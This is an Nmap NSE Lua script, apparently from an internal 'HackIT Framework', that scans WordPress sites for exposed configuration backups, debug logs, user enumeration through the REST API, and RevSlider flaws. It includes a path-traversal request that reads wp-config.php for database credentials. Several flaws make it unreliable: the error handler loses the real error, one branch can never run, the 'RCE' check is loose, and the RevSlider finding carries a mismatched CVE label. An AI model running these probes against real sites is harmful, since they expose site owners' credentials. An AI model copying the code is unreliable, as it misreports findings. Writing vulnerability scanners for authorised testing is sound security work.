local http = require "http"
local stdnse = require "stdnse"

description = [[Checks for WordPress RCE vectors including plugin/theme vulns, file write, config exposure, and sensitive file disclosure.]]
author = "HackIT Framework"
license = "HackIT Framework — Internal Use Only"
categories = {"vuln", "safe"}

portrule = function(host, port) return port.protocol == "tcp" and port.state == "open" and port.service == "http" end

action = function(host, port)
  local ok, result = pcall(function()
    local findings = {}
    local server_banner = ""
    local wp_version = nil

    local banner_req = http.get(host, port, "/")
    if banner_req and banner_req.headers and banner_req.headers["server"] then
      local sv = banner_req.headers["server"]
      server_banner = type(sv) == "table" and sv[1] or sv
    end

    local is_wp = false
    if banner_req and banner_req.body then
      local body = banner_req.body
      if body:match("wordpress") or body:match("WordPress") or body:match("wp%-content") or body:match("wp%-admin") then
        is_wp = true
        wp_version = body:match("WordPress%s+([%d%.]+)") or body:match("ver=([%d%.]+)") or body:match("wp%-includes")
      end
    end

    local critical_paths = {
      {path = "/wp-config.php.bak", checks = {"DB_NAME", "DB_PASSWORD", "DB_USER", "table_prefix"}, severity = "CRITICAL"},
      {path = "/wp-config.php~", checks = {"DB_NAME", "DB_PASSWORD"}, severity = "CRITICAL"},
      {path = "/wp-config.php.old", checks = {"DB_NAME", "DB_PASSWORD"}, severity = "CRITICAL"},
      {path = "/wp-config.php.swp", checks = {"DB_NAME", "DB_PASSWORD"}, severity = "CRITICAL"},
      {path = "/wp-content/debug.log", checks = {"PHP", "Stack trace", "Warning", "Error", "Fatal"}, severity = "HIGH"},
      {path = "/wp-content/uploads/wp_all_backup/wp-config.php", checks = {"DB_NAME"}, severity = "CRITICAL"},
      {path = "/.wp-config.php.swp", checks = {"DB_NAME"}, severity = "CRITICAL"},
      {path = "/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php", checks = {"DB_NAME", "DB_PASSWORD"}, severity = "CRITICAL"},
      {path = "/wp-content/plugins/akismet/akismet.php", checks = {"Plugin Name", "Akismet"}, severity = "INFO"},
      {path = "/wp-content/plugins/hello.php", checks = {"Plugin Name", "Hello"}, severity = "INFO"},
      {path = "/wp-json/wp/v2/users", checks = {"name", "slug", "avatar_urls"}, severity = "MEDIUM"},
      {path = "/wp-json/wp/v2/users?per_page=100", checks = {"name", "slug"}, severity = "MEDIUM"},
      {path = "/wp-content/debug.log", checks = {"PHP Notice", "PHP Warning", "PHP Fatal"}, severity = "HIGH"},
      {path = "/wp-content/uploads/", checks = {"Index of", "wp-content"}, severity = "MEDIUM"},
    }

    for _, cp in ipairs(critical_paths) do
      local req = http.get(host, port, cp.path)
      if req and req.status == 200 then
        local body = req.body or ""
        for _, check in ipairs(cp.checks) do
          if body:match(check) then
            local excerpt = body:sub(1, 100):gsub("\n", " "):gsub("\r", "")
            table.insert(findings, {path = cp.path, check = check, excerpt = excerpt, status = req.status, severity = cp.severity})
            break
          end
        end
        if cp.path:match("wp%-config") and body:match("define") and body:match("%$table_prefix") then
          table.insert(findings, {path = cp.path, check = "wp-config signature", excerpt = body:sub(1, 120), status = req.status, severity = "CRITICAL"})
        end
      elseif req and req.status ~= 404 then
        if cp.path:match("wp%-json") and req.status == 200 then
          local body = req.body or ""
          if body:match("%[") then
            table.insert(findings, {path = cp.path, check = "REST API exposed", excerpt = body:sub(1, 80), status = req.status, severity = "MEDIUM"})
          end
        end
      end
    end

    local rce_tests = {
      {path = "/wp-admin/admin-ajax.php", data = "action=wp_ajax_foo", severity = "MEDIUM"},
      {path = "/wp-content/plugins/revslider/temp/update_extract/revslider/temp.php", severity = "CRITICAL"},
    }

    for _, rt in ipairs(rce_tests) do
      local req
      if rt.data then
        req = http.post(host, port, rt.path, {
          header = {["Content-Type"] = "application/x-www-form-urlencoded"},
          data = rt.data
        })
      else
        req = http.get(host, port, rt.path)
      end
      if req and req.status and req.status < 400 then
        local body = req.body or ""
        if body:match("HackIT") or body:match("revslider") or body:match("temp") then
          table.insert(findings, {path = rt.path, check = "RCE vector", excerpt = body:sub(1, 60), status = req.status, severity = rt.severity})
        end
      end
    end

    if not is_wp then
      local wp_indicators = {"/wp-login.php", "/wp-admin/", "/xmlrpc.php", "/wp-includes/"}
      for _, p in ipairs(wp_indicators) do
        local req = http.get(host, port, p)
        if req and req.status and req.status < 400 then
          is_wp = true
          break
        end
      end
    end

    if #findings > 0 then
      local result = stdnse.output_table()
      result.cve = "CVE-2017-1001000 (RevSlider), multiple plugin CVEs"
      result.severity = "HIGH"
      result.vulnerable = true
      result.server = server_banner
      result.version = wp_version or "unknown"
      result.detail = ("WordPress exposure found - %d issue(s)"):format(#findings)
      for i, f in ipairs(findings) do
        result[("issue_%d"):format(i)] = ("[%s] %s -> %s"):format(f.severity, f.path, f.check)
      end
      return result
    end

    local result = stdnse.output_table()
    result.cve = "N/A"
    result.severity = is_wp and "MEDIUM" or "LOW"
    result.vulnerable = false
    result.server = server_banner
    result.version = wp_version or "unknown"
    result.detail = is_wp and "WordPress detected but no exposure found" or "No WordPress detected"
    return result
  end)
  if not ok then
    local result = stdnse.output_table()
    result.severity = "MEDIUM"
    result.vulnerable = false
    result.detail = "Error during scan: " .. tostring(result)
    result.error = true
    return result
  end
  return result
end
